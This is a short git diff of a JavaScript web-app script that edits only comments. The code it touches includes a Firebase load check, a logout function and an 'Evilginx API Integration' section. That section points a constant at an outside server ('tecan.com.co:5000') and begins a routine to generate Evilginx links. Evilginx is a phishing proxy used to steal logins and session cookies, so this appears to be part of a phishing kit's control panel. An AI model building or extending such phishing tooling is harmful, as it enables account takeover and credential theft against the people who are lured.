@@ -1,6 +1,6 @@
 console.log("✅ Script.js loaded successfully");
 
-// ✅ Ensure Firebase is Loaded
+// ✅ Ensure Firebase is Loaded Before Running Any Function
 document.addEventListener("DOMContentLoaded", () => {
     if (typeof firebase === "undefined") {
         console.error("❌ Firebase is NOT defined. Check firebase-config.js.");
@@ -52,7 +52,7 @@ function logout() {
     });
 }
 
-// ✅ Evilginx API Integration
+// ✅ Evilginx API Integration (Fixed)
 const EVILGINX_SERVER = "http://tecan.com.co:5000";
 
 // ✅ Generate Evilginx Link
